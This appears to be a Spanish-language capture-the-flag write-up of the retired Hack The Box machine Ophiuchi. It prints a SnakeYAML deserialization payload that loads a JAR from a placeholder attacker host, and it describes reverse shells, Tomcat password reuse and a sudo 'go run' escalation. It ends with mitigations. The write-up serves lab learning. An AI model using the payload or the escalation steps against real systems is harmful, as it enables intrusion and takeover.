---
machine: Ophiuchi
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, tomcat, yaml, deserialization, wasm, go, privesc]
---

# Ophiuchi — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Tomcat 9.0.38 ejecuta una aplicación que parsea YAML con SnakeYAML. Un payload de deserialización carga un JAR remoto y da una shell como `tomcat`; la contraseña de `tomcat-users.xml` se reutiliza para `admin`. `admin` puede ejecutar `go run /opt/wasm-functions/index.go` como root; el programa lee `main.wasm` y ejecuta `deploy.sh`, y ambos se pueden reemplazar para obtener root.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,8080 <IP>
```

- `22` SSH y `8080` Tomcat 9.0.38.
- La página dice que el servicio está caído, pero procesa el YAML enviado.
- `/manager` existe y requiere credenciales.

## Enumeración

El formulario pasa la entrada a un parser YAML de Java. SnakeYAML permite instanciar clases y cargar un JAR remoto mediante `!!java.net.URL`.

```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<ATTACKER>/yaml-payload.jar"]]]]
```

## Foothold

Se compila `yaml-payload` con una clase que ejecuta una reverse shell, se sirve el JAR y se envía el YAML. La shell corre como `tomcat`.

## Movimiento lateral

`/opt/tomcat/conf/tomcat-users.xml` contiene la contraseña del usuario `admin`. Esa contraseña también funciona para la cuenta del sistema `admin`.

```bash
su admin
ssh admin@ophiuchi.htb
```

## Escalada de privilegios

`admin` puede ejecutar `go run /opt/wasm-functions/index.go` como root. El programa lee `main.wasm`, lo ejecuta y, si devuelve 1, llama a `deploy.sh`. Se reemplazan ambos archivos en el directorio de trabajo: un Wasm que devuelve 1 y un `deploy.sh` con una reverse shell.

```bash
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

## Evidencia

- Tomcat y SnakeYAML.
- JAR remoto y shell como `tomcat`.
- Contraseña de `tomcat-users.xml` y `admin`.
- `go run` como root.
- `main.wasm`/`deploy.sh` y root.

## Lecciones aprendidas

- SnakeYAML sin tipos seguros es deserialización explotable.
- Las credenciales de Tomcat se reutilizan en el sistema.
- `go run` como root ejecuta archivos del directorio actual.
- Un binario que confía en un Wasm y un script locales es escritura arbitraria.

## Mitigación y detección

- Usar `SafeConstructor` y no aceptar tipos arbitrarios.
- Separar credenciales de Tomcat y del sistema.
- No ejecutar `go run` como root; usar binarios compilados y rutas absolutas.
- Validar el Wasm y el script antes de ejecutarlos.

## Referencias

- [0xdf — Ophiuchi](https://0xdf.gitlab.io/2021/07/03/htb-ophiuchi.html)
- [IppSec — Ophiuchi](https://www.youtube.com/watch?v=9-AQQkJA1X4)
- [Hack The Box — Ophiuchi](https://app.hackthebox.com/machines/ophiuchi)
